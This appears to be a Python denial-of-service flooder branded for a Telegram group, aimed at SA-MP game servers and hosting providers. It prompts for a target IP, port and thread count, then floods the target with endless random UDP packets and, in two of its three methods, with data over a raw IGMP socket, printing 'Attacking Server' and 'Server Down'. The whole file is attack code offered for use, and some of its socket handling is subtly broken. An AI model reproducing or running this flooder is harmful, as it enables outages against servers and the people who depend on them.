import socket, requests
import random
import threading
import time
import os,sys
import datetime

logo = """
██╗██████╗ ██╗      █████╗ ███╗   ██╗██╗  ██╗
██║██╔══██╗██║     ██╔══██╗████╗  ██║██║ ██╔╝
██║██████╔╝██║     ███████║██╔██╗ ██║█████╔╝ 
██║██╔══██╗██║     ██╔══██║██║╚██╗██║██╔═██╗ 
██║██████╔╝███████╗██║  ██║██║ ╚████║██║  ██╗
╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
       Tools Created By BlankINV
          https://t.me/GSFDDoS
"""
method = """
SAMPV1 [LEMEHOST]
SAMPV2 [ULTRAHOST]
SAMPV3 [RDP]
"""
print(logo)
ip = str(input("Input IP : "))
port = int(input("Input PORT : "))
times = int(input("Input TIMES : "))
print("Threads Recommend to Use is 500-1000")
threads = int(input("Input Threads : "))
os.system("clear")
print(method)
methods = str(input("Input Method to Attack : "))

def SAMPV1():
    packet = random._urandom(4192)
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.sendto(packet, (ip,port))
            for x in range(times):
                s.sendto(packet, (ip,port))
            print(f"[GSF] Attacking Server | ip : {ip} | port : {port}")
        except socket.error:
            print(f"[GSF] Server Down | ip : {ip} | port : {port}")
            s.close()

def SAMPV2():
    packet = random._urandom(8000)
    tcppss = random._urandom(1024)
    sock = socket.socket(socket.AF_INET,socket.IPPROTO_IGMP)
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((ip,port))
            s.sendto(packet, (ip,port))
            sock.send(tcppss)
            for x in range(threads):
               s.sendto(packet, (ip,port))
               sock.send(tcppss)
            print(f"[GSF] Attacking Server | ip : {ip} | port : {port}")
        except socket.error:
            print(f"[GSF] Server Down | ip : {ip} | port : {port}")
            s.close()
            
def SAMPRDPV1():
    packet = random._urandom(8000)
    tcppss = random._urandom(1024)
    sock = socket.socket(socket.AF_INET,socket.IPPROTO_IGMP)
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((ip,port))
            s.sendto(packet, (ip,port))
            sock.send(tcppss)
            for x in range(threads):
                s.sendto(packet, (ip,port))
                sock.send(tcppss)
            print(f"[GSF] Attacking Server | ip : {ip} | port : {port}")
        except socket.error:
            print(f"[GSF] Server Down | ip : {ip} | port : {port}")
            s.close()
 
if methods == "SAMPV1":
	t = threading.Thread(target=SAMPV1).start()

if methods == "SAMPV3":
	t = threading.Thread(target=SAMPRDPV1).start()
	
if methods == "SAMPV2":
	t = threading.Thread(target=SAMPV2).start()